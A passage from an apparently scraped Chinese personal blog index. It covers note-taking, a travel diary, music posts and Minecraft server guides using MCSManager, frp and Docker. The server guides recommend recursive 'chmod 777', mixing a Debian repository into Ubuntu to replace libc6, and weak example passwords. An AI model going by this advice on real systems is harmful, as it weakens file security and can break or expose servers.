学习这个还是再说一下吧，利用黑曜石的学习其实就是把剪藏的内容整理合并提取转换成一篇文章，这产出就对应一个知识点。在这个过程中，双链不一定是必须项。比如在进行一个新领域的学习时，刚开始在现有体系中几乎没有关联项，这是正常的。当然，也可以反过来用这种方法，写作时，遇到陌生名词直接用双链标注出来，之后再创建对应条目进行学习。以此可以快速构建一个新的知识体系。 复习为了衬托所以提一下一般的笔记软件记下的东西基本都是浩如烟海，一个列表就展示完所有内容。当然，你也可能建几个文件夹，然后把一堆东西分成几堆放。在复习的时候，如果能一篇接着一篇笔记的看倒是还好，但是没有整理的话就难说了，光是笔记之间的跳跃性和非关联性就是能让你丧失复习意志力。如果是手写的整本电子笔记的话，进行顺序复习体验应该是最好的。 下面说说用黑曜石怎么复习。 黑曜石的数据以Markdown文件存储，只要在库目录中，嵌套文件夹就不影响结构。所以可以在知识图谱上把同类项全部移动到相同目录中，利用树状结构组织笔记。在线性复习时这帮助很大。我们也可以用图谱进行非线性的关联式复习，打开图谱，从一个节点开始，进行广度优先复习。这样的启发式复习或许能提高记忆的关联性，从而帮助记忆。 思考思维过程本质是冲动在神经元间的传递。同理，黑曜石也可以做到。通过知识图谱，能看到关联知识，并思考其关系。同时，对于二级关联节点，以至于三级关联节点，我们也可以思考其和主节点的关系，在这过程中，对链接/文档进行重组，产生新的知识和关系结构。这种思考能让知识库更有规律和秩序，也能让我们进行有效学习。 应用用自己的知识库去尝试解决问题。根据结果进行主库的维护和修正。遇到问题时，可以在库中搜索关键词，看看关联概念能否提供解决思路。比如我要写一篇人工智能在学习中的应用，就可以在知识图谱中找到人工智能的相关节点，按照广度优先的顺序对其他节点进行联想，借助这种方法找到写作的思路。","link":"/2022/12/12/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E6%88%91%E7%9A%84%E7%9F%A5%E8%AF%86%E5%BA%93%E7%AE%A1%E7%90%86%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/"},{"title":"神社的储物间","text":"序去年3月，正是疫情最为猖獗的时候。社会原有的秩序被打破：学校停课，工厂停转，上班族也被迫在家待着。 现在想起来，这一段时光似乎依然触手可及。桌上放的口罩，电脑里网课的声音，学校门口的测温枪，医院门口的发热患者通道，如此真实。 也正是那段无聊的日子，使我萌生了想做点什么的想法。 在一位好朋友的安利下，我成功入坑了一个阿里云服务器，并开始接触网页制作技术（也就是html5,css3）。 于是，我便想做一个属于我自己的网站。 首先是首页。我偶然看到了一个不错的模板，在一位热心人的帮助下，我很轻松就得到了它的源码。 “有了首页，要不要再做些什么？”正好，那时收集到了一些工具和资料，于是最终决定，做一个储物间。与此同时，因为那时我还是信息部副部长，我还做了一个教程站，想帮他们学习一些计算机相关的知识。 最初，这些网页都是我用html5纯手写出来的。每次更新的时候，都要上传到服务器上（所以也就熟悉了Linux），我甚至写了个自动上传脚本。不过总归是很麻烦。 后来，我的那位好朋友又提出要做一个社员管理系统。那是我第一次正式接触PHP。在发现它的语法很像C语言后，我就很顺畅地上手了。 那时，我甚至不知道，我所谓的“储物间”，其本质上就是一个博客，所以我长期同时维护着三个子网站（除了前面两个，还有一个wordpress博客）。 后来，教程站停止维护了。教程都迁移到了博客里。再后来，服务器环境出问题了，重置之后数据库热备份的数据不能恢复，差点丢了所有的心血（虽然没写多少）。于是对于wordpress和数据库，我也不太想接触了。这期间，我一直在用PHP升级我的储物间。先是添加了一个文章编辑器，后来又添加了个文件管理工具……后面又添加了一些其他的服务器管理功能。于是经过不断迭代，我出了前6个版本。 在决定写第七个版本之前，我看了下乱成一堆的储物间目录，决定只用一个PHP脚本实现所有功能；抛弃数据库，文章都以markdown文件形式储存。同时在那位好朋友的提醒下，我幡然醒悟，原来，所谓的储物间，就是博客啊。 推出第七个版本之后，我一直在用面向过程的思路去写。虽然也很好用，不过每当我需要更改一些功能的时候，总觉得很麻烦。 于是，便有了这一版博客：神社的储物间v7.2.0 特性在做到纯粹的面向对象的同时，我也坚守了我的想法：所有内容写在一个文件里，不过组件确实是解耦合的。我不但做到了，而且感觉做得比较整齐。 在新增功能以及改动原来功能的时候，我深切体会到了面向对象优势之巨大。现在这个版本，即使添加了很多功能，程序也基本没有bug。只要做好每个组件，明确每个函数的使用范围，就基本不会出问题了。 后续费了老大劲，虽然是把这个版本做出来了，不过在接触了新技术之后，还是感觉有些地方做得不太好。比如移动端UI的适配不是很好，前后端的分离做得比较乱，旧版的一些已经不太好用的功能依旧没有重写更新。 不过总而言之，这是一个里程碑式的版本。因为经过我的认真思考之后，重新规划的程序结构清晰了许多。 写这个博客系统的目的不光是找些事做，记录一些东西，同时也是为了记录我的PHP学习历程。 作为我的第一个能称得上很有用的程序作品，我会一直优化它，升级它—— 即使，这只是一个出生在博客已经不为人所关注的时代，小得不能再小，基本没有人会看的，一个简简单单的博客。 深夜瞎想最近（2022.11.15）又换回hexo了一段时间。怎么说呢，又找回了那种纯粹写作的感觉。只需要在编辑器里写好，剩下的只需要跑一下deploy脚本，就能把所有东西扔到网站上了。特别是搭配上github pages，实在是妙不可言。 遂重新思考这个动态站还有没有意义。不过很快我就发现这是一个蠢问题：就算没意义我也会去维护它的，这就是代码的乐趣啊。 最近又接触了下docsify，学了下前端路由，发现之前的“前后端分离”，其实就是模板引擎后端渲染而已。静态站的速度实在是美好，以至于我有点想尝试下纯前端+PHP API了（当然用别的也行，Golang就不错）。 而且以前的代码量之所以巨大，就是因为考虑了在线编写的需求。现在自己一般不会这么干了，所以这部分用其他方式解决就好。这样，只保留核心代码，应该能整个更好点的博客系统出来。 增加类docsify的纯前端站点 git文章管理 保留模板渲染引擎，为了兼容性和实现4 增加生成静态站的功能，最好还能支持github pages 前端加点功能：代码块高亮，tex支持 整个前端编辑器，用API提交文章到后端 写一个核心类，其他功能写成插件的形式，拓展性整好点 后端代码可以用好几种语言写，写完互相翻译 试试.NET CORE？ 想想怎么支持各种主题吧 评论区该怎么做呢？ 数据库……还是算了吧 加点有意思的页面？ 邮件支持要不要整上呢 整个发送到储物间工具，资料一秒入库 其他hexo的好玩的东西，比如文章加密，各种没啥用的东西 哦对了还有安全也得考虑一下","link":"/2021/07/28/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E7%A5%9E%E7%A4%BE%E7%9A%84%E5%82%A8%E7%89%A9%E9%97%B4/"},{"title":"音乐推荐：時の風","text":"[[游戏/东方Project/東方Project：同人界永远的奇迹|東方Project]]第三作～东方梦时空未使用曲：時の風 2un乐评： 东方梦时空 未使用曲其１ 在还没有设计角色之前，制作游戏系统时所使用的曲子。 最后，由于没有和这首曲子对得上的角色所以就废弃掉了。＊８６兼容音源专用 是一首相当欢快的曲子呢。虽然是未使用曲，但是这首曲子绝对不输任何一首使用曲。 都说旧作神曲多，但是因为被扣上黑历史的帽子而无人问津，实在令人扼腕。 有时间的话，听一听旧作曲吧。在那里，你能感受到东方project最初的样子。 回到这首曲子本身上。它很好地表现出了风的细碎感，因此整个曲子都带着一种轻盈的感觉。 好像随时都会飞起来的感觉呢。（笑） 1997.12.29-2021.1.1。离这首曲子诞生也过去了24年。让我们伴随着时间之风，向着未来，全力飞去。","link":"/2021/01/01/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E9%9F%B3%E4%B9%90%E6%8E%A8%E8%8D%90%EF%BC%9A%E6%99%82%E3%81%AE%E9%A2%A8/"},{"title":"音乐推荐：幻想净琉璃","text":"无需多言。请插上耳机，一起感受这回荡于天地之间的狂风暴雨吧。 点击进入","link":"/2020/12/21/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E9%9F%B3%E4%B9%90%E6%8E%A8%E8%8D%90%EF%BC%9A%E5%B9%BB%E6%83%B3%E5%87%80%E7%90%89%E7%92%83/"},{"title":"音乐推荐：秋霜玉～Clockworks","text":"一首很有幻想感的曲子。无何有之乡的感觉呢。 ZUN乐评：这是从秋霜玉而来的标题曲【 秋霜玉 ～ Clockworks 】。因为本来是短而阴暗的曲子，所以变成了阴暗而又短的曲子。明明我一开始的时候一点也没打算创作这么阴暗的曲子。啊，说错，还是有一点的，不对，是稍微有一点… 不，是相当…(^^; 啊，对了。这首曲子是西方project的第一作sh1：西方秋霜玉的标题曲。","link":"/2020/12/21/%E6%96%87%E5%AD%A6/%E6%9D%82%E8%B0%88/%E9%9F%B3%E4%B9%90%E6%8E%A8%E8%8D%90%EF%BC%9A%E7%A7%8B%E9%9C%9C%E7%8E%89%EF%BD%9EClockworks/"},{"title":"青岛之行","text":"第0天-西安市长安区这个考试月是真能破人的防，所以哥们考完试直接开润，好好抚慰以一下难绷的心智。跟哥们合计了一下，寻思着去码头整点薯条然后就有了去青岛溜达一圈的打算。 现在是1.18，早上随便叼个面包，拉着箱子就走了。今天早上西安的雾气挺大的，走的时候大概9点，门口不少拉箱子回家的大学生，看了一眼感觉不少大三老东西，还有一些大一大二一看就没在校门口坐过公交的。 时间过得真快啊，还没多久就只剩一年半了。 抛开有的没的，到站下车转地铁，6倒2到北站等火车。以及再次，西安北站真tm大。 顺利和彦汇合上，俩人就坐下来开始侃大山，路上风景倒是不错。刚开始计划的路线里边是经过郑州的，不过后来换了D1672然后就不走那边了，现在的路线是西安-&gt;太原-&gt;石家庄-&gt;德州-&gt;济南-&gt;青岛。全程从11点到晚上9点，车程比较长。 在动车上跟哥们干了各种事消磨时间：看时间，聊二次元等等等等，听得我都想入坑ba了。 下了车之后直接进了地铁站，七拐八拐到了酒店。这边地铁修的比较新，所以装潢还挺新的。 出了站之后走了点路就到了酒店。俩人一进酒店就开始开香槟，30块一晚上是这住宿条件： 更香槟开爆的一集：30多跟哥们恰烧烤外卖恰到撑。老陕震撼.jpg，这边伙食是真不戳。 就是晚上1点多给另一个哥们写代码到早上3点有点难绷 彦：熬夜别似我旁边我：无所谓我收入高 第1天-青岛海军博物馆&amp;杂七杂八第二天起了个大早九点准时起床，身体好像已经习惯六小时睡眠了。简单收拾之后就准备出发去看看船了。放6年前彦估计更兴奋，毕竟他玩碧蓝航线。 哎，泛二刺螈。哦，他现在玩Blue Archive。 笑死，早起根本没用。俩人还是差点迟了。最骚的操作是我们发现时间可能赶不上然后俩啥必退票准备换时间，然后发现别的时间都满了。 tmd吓个半死，赶紧给重新定回那个时间。俩人跟俩萝卜一样，一人一个坑给剩下俩位置占满了。 不管时间是不是来不及，俩人开始往过疯狂冲刺。趁着上车的间隙，算了一下时间，刚好剩了3分钟，所幸最后没迟到。 路上路过一片小区，人建筑风格特别欧式，一度以为是殖民地残留，被哥们吐槽了。 彦：你这得让青岛人笑话死 赶时间所以没想到啥吐槽。穿过博物馆大厅，从扶梯下去，就是海边了。大厅后边就是黄海的海岸线了，码头停了不少待参观的船，潜艇，还有来码头整点薯条的海鸥，不过这会的我显然还没有意识到青岛的海风自带湿冷的魔法攻击。 没顾得上拍照，赶紧跟着哥们跑去核潜艇参观区域。俩人兴冲冲跟着引导员走到潜艇入口，准备从入口进去。不过刚进去入口的时候我就觉得不对劲了：被狠狠磕了一下脑袋。然后我才注意到，这潜艇里边的环境是真tm狭小。里边是不允许拍照的，所以这部分没有图图。很震撼，有种纯粹工业风的美感，而且还能看到生产日期跟自己爸妈一个年龄的各种粗扩庞大不知道能干啥不可名状的巨大机械/管道，元素相当丰富。整体而言，环境相当压抑。居住区空间极小，而且是两层乃至三层的卧铺，躺床上只能看到压抑的上铺床板。更离谱的是，各个区域之间的连通通道不是门结构，而是环状圆盘盖子结构。想了半天，原因可能是为了进一步保证气密/作为一种空间隔断手段而使用，以至于人过去是要钻过去的——我自己身高1米8多，已经不是脑袋磕的疼不疼的问题了，那是我弯腰过去会被卡在门上的问题。不过也能理解，毕竟从外边看体积本来就小，里边的空间更是寸土寸金。另外还看到唯一一个很大的房子，俺猜测应该是船长/政委的？另外就是这个核动力潜艇很明显属于那种过于落后可以展示的那种，现在的潜艇长啥样子我根本不敢想象。以及这玩意的制造时间也跟我印象里边那会还在为造拖拉机发愁的轻工业为主的年代严重不符——现在回望那会的前辈，相当厉害。快60年前的东西，都能带给我如此巨大的震撼。这种旧时代的堪称疯狂的造物是我非常喜爱的，因为这背后是一个集体倾尽全力所能创造的工程学奇迹。其他宏伟的古早人工造物，比如早些时代的防空洞，那些旧时代的大型工厂，都是我的偏爱。 就是里边一些现代化电子设备比较出戏。我甚至还看到一个生产日期挺新的电风扇。 另外一点我想展开说的就是，重工业风。生活中很难见到特别粗的管道，这边有，而且尺寸范围相当大。但是你放工厂我会欣赏，放正常过道两边甚至头顶，盖得你看不到一个平整的仓壁，那就是幽闭恐惧症级别的地狱绘图了。墙上和地上，不是覆盖着，那几乎是管道和数量巨大的阀门、仪表拼接而成，被挤压的只剩下常人几乎不可能迅速通过的极度不规则的逼仄空间。另外我找了半天愣是没找到一个窗户，在这种暗无天日的地方关上不知道多久，一般人在这种地方肯定会疯。而且，潜艇的战略地位，也昭示着潜艇兵的命运：不存在侥幸，深海出故障的情况下，只有死亡这一既定而缓慢但恒定到来的命运。现代核潜艇更是战略级别的威慑，他们所面对的任何一种情况都是极度恐怖的。 彦：这地方你待上没几天就幽闭恐惧症了我：难怪人补贴空军之下第一档呢，这我是真服 最逆天的地方来了。俩人参观完核动力部分，在看主电机的时候，里边照明电路突然断电了。以潜艇的封闭程度，一瞬间里边就陷入一片死黑。 我：啊？彦：啊？？我：啊？？？彦：啊？？？？ 所幸，大概十几秒后供电又恢复力。不过这一段时间对我来说长如极夜。那一刻俩啥必都以为自己要被关里头了，怂的跟受惊的兔子似的。应该是拉闸老大爷听到我俩动静了，又上电问里边有人没。俩人赶紧从出口窜出去了。 最哈人的一集。 出去之后俩人缓了会，然后上旁边开始今天的观景了。 首先是济南舰，最后是长江舰。中间回去休息了一下，看到底下一架遮住的飞机，还惊喜了半天。彦不屑一顾，我诧异半天才想起来人是瓜，啊不，三航爷。 下午拍了一组片子，顺便跟他玩了玩胶片机之后，俩人就出来去信号山旁边一个小地方恰了饭。28一份的土豆牛肉盖饭，好贵……不过胜在离景点近。可惜的是那会德国监狱旧址已经关门了，俩人就去爬旁边信号山了。有一说一，上边视野不错，也出了不少很满意的片。 最给力的是这俩老鸽： 亮灯之后拍了不少，遗憾的是树杈子太挡视野了，不太好出片。以及某人痛定思痛决定回头整个脚架。不过那边有不少望远镜，挺稳的，就是要扫码才能用。所以俩人直接用这玩意当脚架平替了。 彦：纯，太纯了（陶醉 之后俩人坐地铁打算去那家甜甜烧烤，可惜让百度地图坑了一回，从台北街道绕了一圈到人旧址了。找到之后发现人就在起点附近。更离谱的是进去只有一个空座，上二楼发现没位置结果下来一楼也满了。红温了.jpg 没办法，刚好也晚了，在旁边步行街吃了点小吃，坐地铁回宾馆旁边那家烧烤。线上挺好吃的，线下也可以，不过人店面似乎主营是外卖。但是实惠和味道上没让我失望，啤酒上没让我哥们失望。 干完饭，回酒店睡觉。替哥们负重前行了一天，倒头就睡。 第2天-麦岛，栈桥，海鸥和薯条，以及代码早上看天气预报，这边要下雪，感觉今天天气可能会有点糟……不过好在出去之后倒是没雪。这边天气这几天是冷锋过境，属于是变天如变脸的程度。 这一天睡到了自然醒。早上中午步行麦岛，被海风吹傻了。不过出片很多。早上一早上在宾馆写代码……至于为啥，合作项目快到ddl了。不过好在早上没出去，风大的虾仁。午饭是张亮麻辣烫和古茗，味道确实可以就是挺贵。 2点到麦岛，吹海风到3,4点。打车去栈桥捉喂了半天海鸥，哥们的Z50直接ISO爆炸了。6点左右俩人走着上了栈桥溜了个来回，海中间的亭子，别有景致。 步行到教堂，哥特式建筑美感别具一格，感觉薄纱半道的安妮小屋。另，青岛的地名好像真是按照全国省份起名的。 拐下去，在K和M的中门对决中选了M。 然后是1号线，体验了一把6分钟跨海，可惜啥都看不到，就是噪音特大。 看了中石油大学。石油的爷才是爷！ 然后1号线回台东，路上为了我和另一个哥们的ddl疯狂写代码。居然在手机上搞定了。他也从他导师的侧目微笑里边解脱了。这期间哥们遛牵着我逛了这边一个步行街，规模意外的不太大。尝了下青岛啤酒原浆，苦的，喝不懂。给哥们解决了。 俩人开始乱逛，跑奥体对面五四广场乱逛听涛。 打车回宾馆了。洗漱+计划了下行程：济南/淄博，启动！ 算了先别启动了，睡觉了。 第3天-海鸽子鸥，栈桥，小鱼山，德国领事馆旧址，以及夕阳这回来青岛最大的成就，就是薅到了海鸽子海鸥。昨天 第4天-青岛：最澄澈的空与海·太美丽了淄博第5天-济南-老舍你最好没骗我md，跟老舍爆了，俩人冻的要似。 早上9点坐高铁到济南。10点多坐地铁到了宾馆。彦已经困的不行了，遂让他睡了一觉。这酒店条件确实不错，还有厨房。 另外就是济南这边地铁起码是从19年开始修的，这地方东边倒是还行，西边地铁修建难度简直地狱。地下各种复杂的地下水源，断层等等，能有地铁已经很不错了。能看得出来，济南地铁修的很新，而且也符合济南这边的特色：空间辽阔。 中午出发，先去旁边商超里边吃了一顿午饭。好久没吃米饭，俩人就恰了家石锅拌饭。 完事之后，我提出想去浪潮集团总部看看打个卡。毕竟在你电浪潮社也待了三年了，不太远（感觉比国医到你电西门的距离近一些），俩人就走过去了。 另外就是济南地铁 第6天-返航-最背刺的一集早上早早起来，洗漱了下，俩人出门进地铁站。济南这边地铁修的相当新，虽然条形地铁线路比较难换乘，但是有地铁这一点已经薄纱某些地方了，而且还是直达济南东站的。赢！ 最难绷的一集：俩人买票那会发现难买，进站发现人一大群小学生搁那去西安旅游……算是彻底被背刺了。 路上太原开始这段雪景很绝。白色的斑驳成片覆盖在黄色的平原上，在纯蓝天的映射下格外让人有食欲。 遂恰饭点了一顿15元高铁套餐。评价是感觉不如…海棠一楼食堂，但是好tm贵QAQ。 彦这作息跟那啥考拉一样（哎对配色穿搭也差不多）又开始睡了。 路上边看地图边看风景……注意到前边过黄河了，俩人扒窗边看了会，发现了最符合天气的一集：黄河整个冻住了。不过就算是冻住了风光也很不错。 另外就是山西太原附近了，风光很有意思，很多谷地，覆上雪景后别有风味。 路上还路过了香汾，小站没太在意。感知最明显的就是天空从山东沿海地区的澄澈逐渐过渡到熟悉的灰蒙蒙的天空——当然风也小了许多。 西安站倒是下去溜达了一圈，气候温和多了。就是听到一点疑似关门的动静后赶紧钻回去车里边了。车门旁边倒是还有人趁着到站抽烟的，人家就比我淡定多了。 之后不久就到站了。温度比沿海地区温和了很多，饱受折磨的俩人一下子放松下来： 彦：这温度谁拉拉链啊：笑死，根本不冷 不过最后某人还是把拉链拉上了。 俩人混的不错，摇到一个同学开车给我俩接回去了。回去之前几个人一块来搓了一顿mai麦，已经是穷鬼的我必然是点了一份穷鬼套餐，顺便聊了不少时政不是怎么每回的保留环节都是政治乐子啊。另外，宝鸡夜色某种意义上比大明湖强。 坐着同学的车到了家门口，提下箱子，关门，隔着车门和彦挥了挥手 转身，离去。","link":"/2024/01/18/%E6%96%87%E5%AD%A6/%E6%B8%B8%E8%AE%B0/trip-to-tsingdao/"},{"title":"HMCL食用教程","text":"前言说是启动器，其实包括下载、mod管理等等功能都包含了。而且自定义选项也相当丰富，对新手而言，入门简单；对老鸟而言，配置方便。而且还包括Windows，Linux平台支持。总之就是很推荐（ 初始化步骤很简单。 下载客户端文件和Java。如果没有的话，请点击下列链接下载。 HMCL for Windows | Java 下载完之后，把启动器放在一个你能找到的地方。但是别放在桌面之类的地方（ 安装Java。安装文件在上面。 打开HMCL。 若是正版用户：切换登陆方式到正版登录，输入用户名，密码，登陆成功。 非正版用户：选择离线模式，输入自己的游戏昵称（可以随意设定，但是设定好了最好不要随意改）登陆成功。 游戏下载：点击左侧列表的当前目录，随后点击右下角的+，填写名称，修改游戏路径，点击保存 基本就是这样了。","link":"/2021/07/23/%E6%B8%B8%E6%88%8F/Minecraft/HMCL%E9%A3%9F%E7%94%A8%E6%8C%87%E5%8D%97/"},{"title":"MCSManager开服小记","text":"这边先放上来Ubuntu基岩版服务端：https://minecraft.azureedge.net/bin-linux/bedrock-server-1.14.60.5.zip（点击下载，也可以复制链接在服务器上wget下载） 上面那个链接可以直接改后面的版本号下载对应版本。 那先让我们看看mcsm官方的教程。 在 Linux 启动 bedrock 服务端就兼用用 sh 脚本启动的方法，否则很有可能启动失败。 首先下载Linux系统的服务端，其中会有一个叫做 bedrock_server 的文件。 在面板中的 服务端管理 点击 创建新实例 再选择 自定义启动命令 方案。 取好 名字，项目位置推荐默认，下一步。 使用 选择文件上传 上传你的压缩包（必须用zip格式，建议自己下载解压打包成zip），下一步。 启动命令写成 sh start.sh，稍后我们上传这个文件。 在自己的本地电脑创建一个脚本文件叫做 start.sh，写入开服指令:LD_LIBRARY_PATH=. ./bedrock_server 在服务端管理界面中点击 管理，进入文件在线管理，上传这个start.sh的脚本文件。 在文件在线管理界面中，解压你刚刚上传的zip压缩包，稍作休息，耐心等待。开服。 操作过程中，我遇到了这么几个问题。 其一：bedrock_server: Permission denied这个好办。虽然只有面板，但是我还可以自定义启动脚本啊。 直接编辑启动脚本start.sh，在启动指令前面再加一行： chmod 777 -R * 再运行。好！不报错了。 其二：依赖库缺失问题别人已经说得很清楚了，我就直接复制一下作为参考（。） 启动一下试试 LD_LIBRARY_PATH=. ./bedrock_server，发现没有启动成功，查看错误信息 ./bedrock_server: error while loading shared libraries: libcurl.so.4: cannot open shared object file: No such file or directory原来是没有安装libcurl.so.4，百度插一下这个文件属于哪个包，直接安装然后再次启动 apt install libcurl4-openssl-devLD_LIBRARY_PATH=. ./bedrock_server依旧报错，继续查看错误信息，然后查 ./bedrock_server: error while loading shared libraries: libssl.so.1.1: cannot open shared object file: No such file or directory原来是需要安装openssl，安装后再次启动， apt install openssl依旧报错 ./bedrock_server: /lib/x86_64-linux-gnu/libm.so.6: version `GLIBC_2.27’ not found (required by ./bedrock_server)安装libc6 echo ‘deb http://ftp.debian.org/debian/ buster main’ &gt;&gt; /etc/apt/sources.listapt updateapt -t buster install libc6再次启动 LD_LIBRARY_PATH=. ./bedrock_server终于可以正常启动了 差不多就是这样了吧。后面就看某鸽子啥时候处理依赖问题吧（咕","link":"/2021/06/20/%E6%B8%B8%E6%88%8F/Minecraft/MCSManager%E5%BC%80%E6%9C%8D%E5%B0%8F%E8%AE%B0/"},{"title":"Minecraft","text":"Minecraft：永恒的经典游戏Minecraft PE下载 Minecraft PE 音乐包：使用说明：把压缩包中的vanilla_music目录整个解压到/games/com.mojang/resources_packs/下。完成后，打开游戏，享受原版bgm。 Minecraft PE 1.16.201.01：点击下载 Minecraft PE 1.14.60.5：点击下载 Minecraft PE 1.14.30：点击下载 Minecraft PE 1.13.1.5：点击下载 Minecraft PE 1.12.1.1：点击下载 Minecraft PE 1.11.1.2：点击下载 Minecraft PE 1.10.0.4：点击下载 Minecraft PE 1.9.0.15：点击下载 Minecraft PE 1.8.1.2：点击下载 Minecraft PE 1.7.0.13：点击下载 Minecraft PE 1.6.1.0：点击下载 Minecraft PE 1.5.3.0：点击下载 Minecraft PE 1.4：点击下载 Minecraft PE 1.2.1.1：点击下载 Minecraft PE 1.0.2：点击下载 Minecraft PE 0.16.1：点击下载 Minecraft PE 0.15.4：点击下载 Minecraft PE 0.14.1：点击下载 Minecraft PE 0.12.3：点击下载 Minecraft PE 0.10.5：点击下载 Minecraft PE 0.9.5：点击下载 Minecraft PE 0.9.0：点击下载 Minecraft PE 0.8.1：点击下载 Minecraft PE 0.1.0：点击下载 Bedrock Server 1.14.60.5：Minecraft基岩版Linux服务端 其实只要把最后的版本修改一下，就能下到所有版本的服务端 Minecraft Win10下载 Minecraft Win10 1.14.60.5：点击下载（密码:755d） Minecraft Win10 1.16.201.02：点击下载（密码:fiq3） Minecraft Java下载 HMCL-Minecraft启动器：相当好用的一个MC启动器。注意：需要安装Java，并安装到默认路径，否则启动器无法正常运行。Linux版下载|Java下载。 用HMCL就能直接下载MC Java版。 材质包Minecraft PE材质包 CSPE材质包：点击下载 Minecraft Java材质包行为包皮肤Minecraft PE皮肤 东方Project系列皮肤：红白红白红白（震声 Minecraft PC皮肤这里是空的（咕 其他资料 Minecraft PE版指令大全：点击进入 [[写一个基岩版的启动脚本]] [[frp内网穿透搭建Minecraft服务器]] [[MCSManager开服小记]] [[HMCL食用指南]]","link":"/2020/03/18/%E6%B8%B8%E6%88%8F/Minecraft/Minecraft/"},{"title":"frp内网穿透搭建Minecraft服务器","text":"原料 frp：这次搭建服务器的核心工具 一台公网服务器：我用的是腾讯云。性能无所谓 一台跑mc服务端的电脑：我用的自己的台式机 一个公网域名：没有的话用服务器IP也行 准备1.开放端口 Minecraft服务端需要开放25565端口，frp需要开放7000端口作为绑定端口，8080（或者其他闲置端口）作为http端口。如果需要监控面板的话还需要开放7500端口。 开放时，都选择tcp即可。 上述端口都可以根据实际情况改变 2.下载文件 从上述frp链接到的GitHub release页面中下载你需要的版本。服务端和客户端是在同一个tar.gz文件中的，所以只需要下载你公网服务器和本地服务器对应的版本即可。 后缀简介：i386:32位系统；amd64：64位系统；linux：Ubuntu等Linux系统；windows：Windows；arm32/64：arm版系统。按需下载即可。速度慢可以搜搜GitHub加速 配置1.公网服务器：随便创建个目录，用tar -zxvf [文件名]解压文件。不会上传到服务器的自行百度scp。解压完成后保留frps和frps.ini即可。使用vim frps.ini编辑配置文件如下： 123456789[common]bind_port = 7000vhost_http_port = 8080token=114514 #客户端连接密码#下面是监控面板的配置，不需要可以忽略dashboard_addr=0.0.0.0dashboard_port=7500 #监控面板端口。用[你服务器地址]:7500即可访问dashboard_user=114514 #监控面板用户名dashboard_pwd=114514 #监控面板密码 按Esc，输入:wq保存并退出。随后输入screen -dmS frp-server ./frps -c ./frps.ini并回车，创建一个名为frps-server的后台窗口并在其中开启frps服务端。 OK，exit退出连接即可。 2.内网服务器：按照其他的教程开启Minecraft服务器即可，具体搜索Minecraft Java开服。确保端口为25565，随后解压frp并保留frpc和frpc.ini并打开frpc.ini，编辑为： 12345678910[common]server_addr = [你服务器的地址]server_port = 7000token=114514[mcs]type = tcplocal_ip = 127.0.0.1local_port = 25565remote_port=25565 保存退出。双击运行frpc.exe即可。 尾声配好之后按理来说就能玩了。如果有报错的话请Google一下frp+你的报错信息，会有解决办法的。 啊不对重点不是这个……我们上面用了screen来做中转，这样每次重启服务器都需要手动开启服务很麻烦。可以用service一劳永逸解决这个问题：查看本文，教你配置frp为service","link":"/2022/06/28/%E6%B8%B8%E6%88%8F/Minecraft/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BAMinecraft%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"写一个基岩版的启动脚本","text":"首先确保服务器安装了screen，否则无法在后台运行服务端。 其实nohup好像也可以，不过没试过。 文件1：start.sh 1LD_LIBRARY_PATH=. ./bedrock_server 文件2：run_in_scr.sh 1screen -dmS mcpe_1.14.60.5 ./start.sh 启动时，只需要运行run_in_scr.sh即可在screen中启动。","link":"/2021/10/28/%E6%B8%B8%E6%88%8F/Minecraft/%E5%86%99%E4%B8%80%E4%B8%AA%E5%9F%BA%E5%B2%A9%E7%89%88%E7%9A%84%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC/"},{"title":"用Docker开个MC服务器","text":"前段时间好好学了下Docker，于是想试着用它去部署一些比较麻烦的服务端。所以首先就是试试MC了，毕竟能实现服务端跟地图数据分离以及服务端自动化部署，便于迁移确实很爽。 虽然MC服务端的性能敏感性比较高，但是Docker+MC的性能问题比较小，因为基于KVM，虚拟化由内核支持，所以Docker性能开销相当小，日用基本可以忽略。 目标部署好之后，目录下应该只有一个地图文件夹，一个服务端程序，以及一个明确指示了地图文件夹和服务端程序路径的dockerfile。如果使用docker-compose去实现包括mc服务端的外围功能（比如bluemap等地图功能，以及geyser这样的be兼容转换服务端），那也可以，不过得保证数据程序的分离，以及可维护、易于修改的特质。 基于上面的目标，可以使用Volume完成资源的映射。我们需要的只是一个基础的jre镜像。 代码Dockerfile很简单，就是基础的jre镜像，以及启动指令。 123456FROM openjdk:17WORKDIR /appRUN echo &quot;eula=true&quot; &gt; /app/eula.txtCMD [&quot;java&quot;, &quot;-jar&quot;, &quot;server.jar&quot;] 然后是启动脚本，我将几个常用指令封装成一个Bash脚本了： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/bin/bash# 获取第一个参数action=$1# 根据参数执行不同的操作case $action in run) # 运行容器 docker run -d \\ -p 25565:25565 \\ -v $(pwd)/world:/app/world \\ -v $(pwd)/server.jar:/app/server.jar \\ -v $(pwd)/server.properties:/app/server.properties \\ --name mc \\ mc-server ;; build) # 构建镜像 docker build -t mc-server . ;; stop) # 停止容器 docker stop mc ;; start) # 启动容器 docker start mc ;; restart) # 重启容器 docker restart mc ;; backup) # 备份文件 timestamp=$(date +%Y%m%d%H%M%S) zip -r [backup]mc-server-$timestamp.zip world server.properties mc.sh Dockerfile server.jar ;; log) # 输出日志 docker logs -f mc ;; sh) # 进入shell docker exec -it mc sh ;; *) # 输出帮助信息并退出 echo &quot;Usage: $0 {run|build|stop|start|restart|log|sh}&quot; exit 1 ;;esac 然后，在保证目录下有server.jar和server.properties的前提下，使用./mc.sh run来初始化并运行服务端。剩下的用法参考上面的代码，或者参考这里。 外围开了服务器之后，肯定需要对公网/内网开放。我在这里用了一个frp的镜像，同样也将它封装为了启动脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/bin/bash# 定义容器名称和配置文件路径CONTAINER_NAME=frpcCONFIG_FILE=$(pwd)/frpc.ini# 检查参数个数if [ $# -eq 0 ]; then echo &quot;Usage: $0 run|start|stop|restart&quot; exit 1fi# 根据参数执行相应操作case $1 in run) # 部署容器 docker run --restart=always --network host -d -v $CONFIG_FILE:/etc/frp/frpc.ini --name $CONTAINER_NAME snowdreamtech/frpc ;; start) # 启动容器 docker start $CONTAINER_NAME ;; stop) # 停止容器 